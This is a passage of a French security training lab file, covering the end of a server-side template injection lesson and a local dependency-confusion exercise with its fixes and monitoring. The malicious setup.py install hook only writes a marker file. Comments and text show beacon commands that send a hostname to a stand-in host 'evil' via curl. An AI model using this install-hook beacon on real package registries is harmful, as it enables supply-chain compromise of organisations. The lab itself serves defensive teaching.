      code: 'import re, html\n\ndef render(source: str, ctx: dict) -> str:\n    def repl(m):\n        return str(eval(m.group(1).strip(), {"__builtins__": {}}, ctx))\n    return re.sub(r"\\{\\{(.+?)\\}\\}", repl, source)\n\n# CORRECT : source FIXE ecrite par le dev ; input passe en variable, echappe.\nFIXED_TEMPLATE = "Bonjour {{ name }} !"\n\ndef safe_view(user_input: str) -> str:\n    # l\'input devient une DONNEE, echappee, jamais du code de template\n    return render(FIXED_TEMPLATE, {"name": html.escape(user_input)})\n\nprint("input normal :", safe_view("scory"))\nprint("payload SSTI :", safe_view("{{7*7}}"))    # doit s\'afficher LITTERALEMENT\nprint("payload XSS  :", safe_view("<script>"))    # echappe',
      expected:
        "`Bonjour scory !`, puis `Bonjour {{7*7}} !` (affiché littéralement, **pas** 49), puis `<script>` échappé en `&lt;script&gt;`. L'input est traité comme donnée : ni évaluation, ni injection.",
    },
    {
      n: 6,
      title: "Vérifier : sandbox, autoescape et détection",
      goal: "Connaître les garde-fous résiduels et leurs limites.",
      explain:
        "Compléments à la règle « input = variable » :\n\n1. **autoescape** (défaut Flask/Jinja2 sur `.html`) bloque le **XSS** — mais **ne protège PAS** du SSTI. La seule vraie parade SSTI reste : ne pas injecter dans la source.\n2. **`jinja2.sandbox.SandboxedEnvironment`** en dernier recours si tu *dois* rendre des templates fournis par l'utilisateur — en sachant que des **bypass existent** ; à coupler avec isolation process + seccomp.\n3. **Détection** : Bandit / Semgrep (règles SSTI Jinja2), revue de tout `render_template_string`/`Template(...)` avec une variable.\n4. **Défense en profondeur** : moindre privilège, egress filtré (coupe le `os.popen('curl evil')`).\n\nDémo : un mini-grep des appels dangereux, comme le ferait un lint.",
      target: "browser-python",
      code: 'import re\n\n# Ce que Bandit/Semgrep cherchent : input variable -> source de template.\ncode_samples = {\n    "vuln_concat":   "return Template(\'Bonjour \' + name).render()",\n    "vuln_fstring":  "return render_template_string(f\'Bonjour {name}\')",\n    "safe_variable": "return render_template(\'hello.html\', name=name)",\n}\n\nDANGER = re.compile(\n    r"(render_template_string\\s*\\(\\s*f[\\\"\\\']|Template\\s*\\([^)]*\\+)"\n)\n\nfor label, line in code_samples.items():\n    flagged = bool(DANGER.search(line))\n    print(f"[{\'SSTI\' if flagged else \'ok\':>4}] {label}: {line}")\n\nprint("\\nautoescape protege du XSS, PAS du SSTI. Vraie parade : input en variable + lint CI.")',
      expected:
        "`vuln_concat` et `vuln_fstring` sont flaggés SSTI ; `safe_variable` (input passé en variable) est `ok`. À automatiser en CI (Bandit/Semgrep) ; rappel : autoescape ≠ protection SSTI.",
    },
  ],

  // ============================================================
  // 5) dependency-confusion
  //    pip / registres -> conceptuel + démo locale de résolution. read + docker-bash.
  // ============================================================
  "dependency-confusion": [
    {
      n: 1,
      title: "Comprendre : la confusion public vs privé",
      goal: "Saisir comment une version publique peut écraser une dépendance interne.",
      explain:
        "Découverte par **Alex Birsan (2021)** — il a compromis Apple, Microsoft, PayPal & co avec un simple paquet.\n\n**Le principe** : ton org utilise un paquet interne `acme-utils` depuis un **registre privé**. Si le gestionnaire est configuré pour chercher **aussi** sur l'index **public** et qu'il **préfère la version la plus haute** sans distinguer la source, un attaquant qui publie `acme-utils 99.0.0` sur **PyPI public** voit *son* paquet installé à la place de l'interne.\n\nLe twist : l'attaquant n'a **pas besoin du code interne** — juste **le nom**, souvent fuité dans un `package.json`/`requirements.txt`, des logs de build, ou un repo public.\n\n**Surfaces** : pip avec `--extra-index-url` (qui *agrège* privé + PyPI), npm sans scope, tout gestionnaire qui mélange plusieurs sources sans priorité stricte.\n\n**Cadre légal : revendiquer un nom pour piéger une org est une attaque réelle.** Analyse / défense uniquement, ou bug bounty avec scope écrit.",
      target: "read",
    },
    {
      n: 2,
      title: "Reproduire (local) : deux index, deux versions du même nom",
      goal: "Construire un paquet interne et son homonyme 'public' plus récent.",
      explain:
        "On simule **en local** la situation : un paquet interne `acme-utils 1.0.0` (registre privé) et un homonyme `acme-utils 99.0.0` (qui jouerait le rôle du paquet public piégé). Le piège réel exécuterait un beacon à l'install (`curl http://evil/?h=$(hostname)`) ; ici, témoin inoffensif dans `/tmp`.\n\n**Cadre légal : ces paquets restent sur disque local, jamais uploadés.**",
      target: "docker-bash",
      code: 'set -e\nROOT=$(mktemp -d)\n\n# --- "registre prive" : acme-utils 1.0.0 (legitime) ---\nmkdir -p "$ROOT/private/acme_utils-1.0.0/acme_utils"\necho "VERSION = \'1.0.0 (interne)\'" > "$ROOT/private/acme_utils-1.0.0/acme_utils/__init__.py"\ncat > "$ROOT/private/acme_utils-1.0.0/setup.py" <<\'PY\'\nfrom setuptools import setup\nsetup(name="acme-utils", version="1.0.0", packages=["acme_utils"])\nPY\n\n# --- "index public" : acme-utils 99.0.0 (PIEGE, version plus haute) ---\nmkdir -p "$ROOT/public/acme_utils-99.0.0/acme_utils"\necho "VERSION = \'99.0.0 (PIEGE)\'" > "$ROOT/public/acme_utils-99.0.0/acme_utils/__init__.py"\ncat > "$ROOT/public/acme_utils-99.0.0/setup.py" <<\'PY\'\nfrom setuptools import setup\nfrom setuptools.command.install import install\nclass Post(install):\n    def run(self):\n        # EN REEL : os.system("curl http://evil/?h=$(hostname)")\n        open("/tmp/depconf_beacon.txt","w").write("paquet PUBLIC pirate installe\\n")\n        install.run(self)\nsetup(name="acme-utils", version="99.0.0", packages=["acme_utils"],\n      cmdclass={"install": Post})\nPY\n\necho "ROOT=$ROOT" > /tmp/lab_depconf_path.txt\necho "Cree : prive 1.0.0 + public 99.0.0 (meme nom)"\nls "$ROOT/private" "$ROOT/public"',
      expected:
        "Deux paquets `acme-utils` : `1.0.0` (interne, sain) et `99.0.0` (public, piégé). Même nom, versions différentes. Le piège est dans le `setup.py` du 99.0.0.",
    },
    {
      n: 3,
      title: "Observer : pip préfère la version la plus haute",
      goal: "Voir l'install agrégée tirer le 99.0.0 piégé au lieu de l'interne.",
      explain:
        "Le scénario fautif : on installe en **agrégeant** les deux sources (équivalent de `--index-url privé --extra-index-url public`). pip voit deux candidats `acme-utils` et **choisit la version la plus haute, sans distinguer la source** → `99.0.0` piégé. Son `setup.py` s'exécute → beacon.\n\nC'est exactement la faute de config qui a permis l'attaque Birsan. (Si `pip` est absent du lab, lis le mécanisme : *plusieurs sources + préférence à la version la plus haute = confusion*.)",
      target: "docker-bash",
      code: 'set -e\nrm -f /tmp/depconf_beacon.txt\nROOT=$(cut -d= -f2 /tmp/lab_depconf_path.txt)\npython3 -m venv /tmp/depconf_venv && . /tmp/depconf_venv/bin/activate\n\necho "beacon AVANT :"; [ -f /tmp/depconf_beacon.txt ] && echo PRESENT || echo absent\n\n# Installation AGREGEE : les deux sources melangees, pip prend la + haute version.\npip install --quiet \\\n  --find-links "$ROOT/private/acme_utils-1.0.0" \\\n  --find-links "$ROOT/public/acme_utils-99.0.0" \\\n  acme-utils 2>/dev/null || echo "(pip indisponible : voir mecanisme)"\n\npython3 -c "import acme_utils; print(\'version installee :\', acme_utils.VERSION)" 2>/dev/null || true\necho "beacon APRES :"; [ -f /tmp/depconf_beacon.txt ] && cat /tmp/depconf_beacon.txt || echo absent',
      expected:
        "pip installe `99.0.0 (PIEGE)` (version la plus haute) et non l'interne `1.0.0`. Le beacon apparaît : « paquet PUBLIC pirate installe ». En prod = exécution du code attaquant.",
    },
    {
      n: 4,
      title: "Corriger : index privé prioritaire + pins/hashes",
      goal: "Forcer la résolution sur l'interne et bloquer la version surgie.",
      explain:
        "Deux leviers cumulés :\n\n1. **Index privé prioritaire et exclusif** : ne pas mélanger source privée et publique pour les paquets internes. Préférer `--index-url` (privé) **seul** + pull-through proxy contrôlé, plutôt que `--extra-index-url` qui agrège.\n2. **Pinning + hashes** : `--require-hashes` + version exacte committée → une version publique « plus haute » n'est **pas** tirée (mauvaise version, mauvais hash → refus).\n\nDémo : on réinstalle en ciblant **uniquement** la source privée + version épinglée. Le 99.0.0 piégé n'est jamais candidat.",
      target: "docker-bash",
      code: 'set -e\nrm -f /tmp/depconf_beacon.txt\nROOT=$(cut -d= -f2 /tmp/lab_depconf_path.txt)\n. /tmp/depconf_venv/bin/activate 2>/dev/null || python3 -m venv /tmp/depconf_venv && . /tmp/depconf_venv/bin/activate\npip uninstall -y acme-utils >/dev/null 2>&1 || true\n\n# CORRECT : SEULEMENT la source privee + version EPINGLEE. Pas d\'agregation public.\npip install --quiet \\\n  --no-index \\\n  --find-links "$ROOT/private/acme_utils-1.0.0" \\\n  "acme-utils==1.0.0" 2>/dev/null || echo "(pip indisponible : voir mecanisme)"\n\npython3 -c "import acme_utils; print(\'version installee :\', acme_utils.VERSION)" 2>/dev/null || true\necho "beacon ?"; [ -f /tmp/depconf_beacon.txt ] && echo PRESENT || echo absent',
      expected:
        "pip installe `1.0.0 (interne)` et le beacon reste absent : le 99.0.0 public n'est jamais candidat. Source privée exclusive + version épinglée = pas de confusion possible.",
    },
    {
      n: 5,
      title: "Vérifier : namespacing, provenance et monitoring",
      goal: "Mettre en place les défenses organisationnelles durables.",
      explain:
        "Au-delà de la config pip locale :\n\n1. **Namespacing / réservation** : npm `@yourorg/pkg` ; côté Python, **réserver les noms** de tes paquets internes sur PyPI public (placeholder) pour empêcher le squat.\n2. **Repository manager** (Artifactory/Nexus) configuré pour **résoudre l'interne avant l'externe** et bloquer les noms internes côté upstream public.\n3. **Pinning + hashes** : `--require-hashes`, lockfile committé (rappel étape 4).\n4. **Provenance** : Trusted Publishing/OIDC, signatures **Sigstore** ; alerte si un nom interne apparaît soudain sur l'index public.\n5. **Détection** : `pip-audit`/Socket.dev + **monitoring** des publications publiques portant tes noms de paquets.\n\nDémo : un check qui alerte si un nom interne est revendiqué côté public.",
      target: "docker-bash",
      code: 'set -e\n# Inventaire des noms de paquets INTERNES de l\'org :\nINTERNAL="acme-utils acme-auth acme-billing"\n\n# Simulation d\'un "index public" ou un nom interne vient d\'apparaitre (squat) :\nPUBLIC_SEEN="left-pad requests acme-utils flask"\n\necho "--- Monitoring dependency-confusion ---"\nfor name in $INTERNAL; do\n  if echo "$PUBLIC_SEEN" | grep -qw "$name"; then\n    echo "[ALERTE] nom interne \\"$name\\" revendique sur l\'index PUBLIC -> squat probable"\n  else\n    echo "[  ok  ] \\"$name\\" non present cote public"\n  fi\ndone\n\necho\necho "Defenses : index prive exclusif | noms reserves | repo manager (interne>externe) | --require-hashes | Sigstore/OIDC"',
      expected:
        "Le check alerte sur `acme-utils` (présent côté public = squat probable) et marque `acme-auth`/`acme-billing` comme `ok`. C'est le monitoring à automatiser : toute apparition publique d'un nom interne = alerte immédiate.",
    },
  ],
};
